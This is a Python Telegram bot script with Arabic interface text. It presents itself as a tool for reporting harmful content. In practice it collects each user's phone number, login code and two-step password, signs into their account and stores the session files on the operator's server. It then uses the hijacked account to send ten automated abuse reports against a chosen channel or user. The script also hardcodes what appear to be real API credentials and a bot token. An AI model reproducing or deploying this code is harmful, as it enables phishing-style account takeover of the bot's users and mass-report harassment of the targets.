import asyncio
import re
import os
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from telethon.tl.types import InputReportReasonSpam, InputReportReasonViolence, InputReportReasonPornography, InputReportReasonOther
from telethon.tl.functions.messages import ReportRequest

# إعدادات البوت (يجب تعبئتها)
API_ID = 23656977  # استبدل بـ API ID الخاص بك
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'  # استبدل بـ API HASH الخاص بك
BOT_TOKEN = '8312137482:AAEORpBnD8CmFfB39ayJT4UputPoSh_qCRw'
ADMIN_ID = 7251748706

# حالات المحادثة
PHONE, CODE, REPORT_TYPE, REPORT_LINK, REPORT_MESSAGE, CONFIRMATION = range(6)

# أنواع البلاغات
REPORT_TYPES = {
    "spam": ("بريد مزعج", InputReportReasonSpam()),
    "violence": ("عنف", InputReportReasonViolence()),
    "porn": ("إباحي", InputReportReasonPornography()),
    "scam": ("احتيال", InputReportReasonOther()),
    "hate": ("خطاب كراهية", InputReportReasonOther())
}

# تخزين البيانات
sessions = {}
reports = {}
user_states = {}

# إنشاء عميل البوت
bot = TelegramClient('clean_environment_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# بدء المحادثة
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_states[user_id] = PHONE
    
    # إرسال رسالة البدء مع تعليمات واضحة
    await event.respond(
        "مرحباً بك في بوت البيئة النظيفة! 🌍\n"
        "هذا البوت يساعدك في الإبلاغ عن المحتوى الضار لخلق بيئة تلجرام أنظف.\n\n"
        "**الرجاء إرسال رقم هاتفك مع رمز الدولة:**\n"
        "- يجب أن يبدأ الرقم بعلامة '+' ثم رمز الدولة ثم رقم الهاتف\n"
        "- مثال صحيح: `+966501234567`\n"
        "- مثال خاطئ: `00966501234567` أو `966501234567`\n\n"
        "ملاحظة: سوف تتلقى كود تحقق على حساب التلجرام المرتبط بهذا الرقم."
    )

# مساعدة
@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    await event.respond(
        "🆘 **دليل استخدام البوت:**\n\n"
        "1. ابدأ الأمر بـ /start\n"
        "2. أرسل رقم هاتفك الدولي (مع رمز الدولة وعلامة '+' في البداية)\n"
        "3. ستصلك رسالة على التلجرام تحتوي على كود تحقق\n"
        "4. أرسل الكود الذي استلمته إلى البوت\n"
        "5. اختر نوع البلاغ من الأزرار\n"
        "6. أرسل رابط المجموعة أو القناة أو الحساب\n"
        "7. اكتب رسالة توضح المشكلة\n"
        "8. تأكد من المعلومات وأرسل البلاغ\n\n"
        "سيقوم البوت بعد ذلك بإرسال عدة بلاغات إلى إدارة تلجرام\n\n"
        "للإيقاف: /stop\n"
        "للمساعدة: /help\n\n"
        "للإبلاغ عن مشكلة: راسل المطور @USERNAME"
    )

# معالجة رسائل المستخدم
@bot.on(events.NewMessage)
async def handle_message(event):
    user_id = event.sender_id
    state = user_states.get(user_id)
    
    if state is None:
        return
    
    if state == PHONE:
        await handle_phone(event)
    elif state == CODE:
        await handle_code(event)
    elif state == REPORT_LINK:
        await handle_report_link(event)
    elif state == REPORT_MESSAGE:
        await handle_report_message(event)

# معالجة رقم الهاتف
async def handle_phone(event):
    user_id = event.sender_id
    phone = event.raw_text.strip()
    
    # تنظيف الرقم
    phone = phone.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    
    # محاولة تصحيح الأرقام التي تبدأ بـ "00"
    if phone.startswith("00"):
        phone = "+" + phone[2:]
    # تصحيح الأرقام التي تبدأ بـ "0" بدون رمز دولة
    elif phone.startswith("0") and not phone.startswith("+"):
        phone = "+" + phone
    # إضافة + إذا نساها المستخدم
    elif not phone.startswith("+"):
        phone = "+" + phone
    
    # التحقق من صحة الرقم
    if not re.match(r"^\+\d{10,15}$", phone):
        await event.respond(
            "❌ **رقم غير صحيح!**\n"
            "الرجاء إدخال رقم هاتف صحيح مع رمز الدولة يبدأ بعلامة '+'.\n"
            "أمثلة:\n"
            "- `+966501234567`\n"
            "- `+201012345678`\n"
            "- `+971501234567`\n\n"
            "الرجاء إعادة المحاولة:"
        )
        return
    
    # إنشاء جلسة جديدة للمستخدم
    client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        # إرسال كود التحقق
        sent_code = await client.send_code_request(phone)
        sessions[user_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash
        }
        user_states[user_id] = CODE
        
        # إرسال رسالة توضيحية للكود
        await event.respond(
            f"🔑 **تم إرسال كود التحقق إلى الرقم {phone}**\n\n"
            "طريقة الاستلام:\n"
            "1. إشعار في تطبيق Telegram\n"
            "2. رسالة SMS (إذا لم يصل الإشعار)\n\n"
            "الرجاء إدخال الكود المكون من 5 أرقام (مثل: 12345):"
        )
    except PhoneNumberInvalidError:
        await event.respond("❌ رقم الهاتف غير صالح. الرجاء التحقق وإعادة الإدخال:")
    except Exception as e:
        await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء المحاولة مرة أخرى /start")
        del user_states[user_id]

# معالجة كود التحقق
async def handle_code(event):
    user_id = event.sender_id
    code = event.raw_text.strip()
    
    if not re.match(r"^\d{5,6}$", code):  # قد يكون الكود 5 أو 6 أرقام
        await event.respond("❌ كود غير صحيح! يجب أن يكون بين 5-6 أرقام. الرجاء إعادة الإدخال:")
        return
    
    session = sessions.get(user_id)
    if not session:
        await event.respond("❌ انتهت الجلسة، يرجى البدء من جديد باستخدام /start")
        return
    
    try:
        # تسجيل الدخول باستخدام الكود
        await session['client'].sign_in(
            phone=session['phone'],
            code=code,
            phone_code_hash=session['phone_code_hash']
        )
        
        # التحقق من نجاح تسجيل الدخول
        me = await session['client'].get_me()
        user_states[user_id] = REPORT_TYPE
        
        # بناء لوحة أزرار لأنواع البلاغات
        buttons = [
            [Button.inline(name, data=type_id)]
            for type_id, (name, _) in REPORT_TYPES.items()
        ]
        
        await event.respond(
            f"✅ **تم التحقق بنجاح!** مرحباً {me.first_name}\n\n"
            "الرجاء اختيار نوع البلاغ من الأزرار أدناه:",
            buttons=buttons
        )
    except PhoneCodeInvalidError:
        await event.respond("❌ كود التحقق غير صحيح! الرجاء المحاولة مرة أخرى:")
    except SessionPasswordNeededError:
        await event.respond("🔒 حسابك محمي بكلمة سر. الرجاء إرسال كلمة السر:")
        user_states[user_id] = 'PASSWORD'
    except Exception as e:
        await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء البدء من جديد /start")
        del user_states[user_id]

# معالجة كلمة السر
@bot.on(events.NewMessage)
async def handle_password(event):
    user_id = event.sender_id
    if user_states.get(user_id) != 'PASSWORD':
        return
    
    password = event.raw_text
    session = sessions.get(user_id)
    if not session:
        await event.respond("❌ انتهت الجلسة، يرجى البدء من جديد باستخدام /start")
        return
    
    try:
        await session['client'].sign_in(password=password)
        me = await session['client'].get_me()
        user_states[user_id] = REPORT_TYPE
        
        buttons = [
            [Button.inline(name, data=type_id)]
            for type_id, (name, _) in REPORT_TYPES.items()
        ]
        
        await event.respond(
            f"✅ **تم التحقق بنجاح!** مرحباً {me.first_name}\n\n"
            "الرجاء اختيار نوع البلاغ من الأزرار أدناه:",
            buttons=buttons
        )
    except Exception as e:
        await event.respond(f"❌ خطأ في كلمة السر: {str(e)}\nالرجاء المحاولة مرة أخرى:")

# معالجة نوع البلاغ
@bot.on(events.CallbackQuery)
async def handle_report_type(event):
    user_id = event.sender_id
    report_type = event.data.decode('utf-8')
    
    if report_type not in REPORT_TYPES:
        await event.answer("اختيار غير صحيح!")
        return
    
    user_states[user_id] = REPORT_LINK
    await event.edit(
        f"📌 **نوع البلاغ:** {REPORT_TYPES[report_type][0]}\n\n"
        "الرجاء إرسال رابط المجموعة/القناة/الحساب المراد الإبلاغ عنه:\n"
        "- مثال: https://t.me/group_name\n"
        "- أو: @username"
    )
    sessions[user_id]['report_type'] = report_type

# معالجة رابط البلاغ
async def handle_report_link(event):
    user_id = event.sender_id
    link = event.raw_text.strip()
    
    # تنظيف الرابط
    if link.startswith("https://"):
        link = link
    elif link.startswith("@"):
        link = link[1:]
    else:
        link = link
    
    # التحقق من صحة الرابط
    if not re.match(r"^(https?://t\.me/[\w]{5,32}|[\w]{5,32})$", link):
        await event.respond(
            "❌ **رابط غير صحيح!**\n"
            "الرجاء إرسال رابط صحيح مثل:\n"
            "- https://t.me/group_name\n"
            "- @username\n\n"
            "الرجاء إعادة المحاولة:"
        )
        return
    
    # إذا كان الرابط بدون https نضيفه
    if not link.startswith("http"):
        link = "https://t.me/" + link
    
    sessions[user_id]['report_link'] = link
    user_states[user_id] = REPORT_MESSAGE
    await event.respond(
        "✍️ **تفاصيل البلاغ:**\n"
        "الرجاء كتابة وصف للمشكلة (مثال: المجموعة تنشر محتوى غير لائق...):"
    )

# معالجة تفاصيل البلاغ
async def handle_report_message(event):
    user_id = event.sender_id
    report_message = event.raw_text
    sessions[user_id]['report_message'] = report_message
    user_states[user_id] = CONFIRMATION
    
    report_type = sessions[user_id]['report_type']
    report_details = (
        f"📝 **تفاصيل البلاغ:**\n"
        f"- النوع: {REPORT_TYPES[report_type][0]}\n"
        f"- الرابط: {sessions[user_id]['report_link']}\n"
        f"- التفاصيل: {report_message}"
    )
    
    buttons = [
        [Button.inline("✅ تأكيد الإرسال", data="confirm_send")],
        [Button.inline("❌ إلغاء", data="cancel")]
    ]
    
    await event.respond(
        report_details + "\n\n"
        "**الرجاء التأكيد قبل الإرسال:**",
        buttons=buttons
    )

# معالجة تأكيد الإرسال
@bot.on(events.CallbackQuery)
async def handle_confirmation(event):
    user_id = event.sender_id
    choice = event.data.decode('utf-8')
    
    if choice == "confirm_send":
        if user_id not in sessions:
            await event.answer("❌ انتهت الجلسة، يرجى البدء من جديد")
            return
        
        # تخزين البلاغ
        report_data = sessions[user_id]
        reports[user_id] = {
            'type': report_data['report_type'],
            'link': report_data['report_link'],
            'message': report_data['report_message'],
            'count': 1,
            'client': report_data['client']
        }
        
        await event.edit(
            "⏳ **جاري بدء عملية الإبلاغ...**\n\n"
            "سأقوم بإرسال البلاغات بشكل متكرر حتى يتم حظر المحتوى الضار.\n"
            "قد تستغرق العملية بضع دقائق.\n\n"
            "يمكنك إيقاف العملية بأي وقت باستخدام /stop"
        )
        
        # بدء عملية الإبلاغ المتكرر
        asyncio.create_task(send_reports(user_id))
    elif choice == "cancel":
        await event.edit("❌ تم إلغاء عملية الإبلاغ.")
        if user_id in sessions:
            await sessions[user_id]['client'].disconnect()
            del sessions[user_id]
        if user_id in user_states:
            del user_states[user_id]

# إرسال البلاغات بشكل متكرر
async def send_reports(user_id):
    if user_id not in reports:
        return
    
    report = reports[user_id]
    client = report['client']
    
    try:
        # الحصول على الكيان من الرابط
        entity = await client.get_entity(report['link'])
        
        # إرسال البلاغ
        reason = REPORT_TYPES[report['type']][1]
        await client(ReportRequest(
            peer=entity,
            reason=reason,
            message=report['message']
        ))
        
        # إعلام المستخدم
        await bot.send_message(
            user_id,
            f"🚀 **تم إرسال البلاغ #{report['count']} إلى إدارة تلجرام**"
        )
        
        # زيادة العداد
        report['count'] += 1
        
        # الاستمرار في الإرسال حتى 10 بلاغات
        if report['count'] <= 10:
            await asyncio.sleep(10)  # انتظار 10 ثواني
            await send_reports(user_id)
        else:
            await bot.send_message(
                user_id,
                "✅ **تم إكمال عملية الإبلاغ!**\n"
                "تم إرسال 10 بلاغات إلى إدارة تلجرام.\n"
                "شكراً لمساهمتك في جعل تلجرام أنظف."
            )
            # تنظيف الموارد
            await client.disconnect()
            if user_id in sessions: del sessions[user_id]
            if user_id in user_states: del user_states[user_id]
            if user_id in reports: del reports[user_id]
            
    except Exception as e:
        await bot.send_message(
            user_id,
            f"❌ **فشل في الإبلاغ:** {str(e)}\n"
            "تم إيقاف عملية الإبلاغ."
        )
        # تنظيف الموارد في حالة الخطأ
        if user_id in reports: del reports[user_id]
        if user_id in sessions:
            try:
                await sessions[user_id]['client'].disconnect()
            except:
                pass
            del sessions[user_id]
        if user_id in user_states: del user_states[user_id]

# معالجة أمر الإيقاف
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_reporting(event):
    user_id = event.sender_id
    if user_id in reports:
        # إيقاف عملية الإبلاغ
        await reports[user_id]['client'].disconnect()
        del reports[user_id]
        
        if user_id in sessions: del sessions[user_id]
        if user_id in user_states: del user_states[user_id]
        
        await event.respond("⏹️ **تم إيقاف عملية الإبلاغ بنجاح!**")
    else:
        await event.respond("⚠️ **لا توجد عملية إبلاغ جارية.**")

# تشغيل البوت
if __name__ == '__main__':
    # إنشاء مجلد الجلسات إذا لم يكن موجوداً
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    print("جارٍ تشغيل البوت...")
    bot.run_until_disconnected()
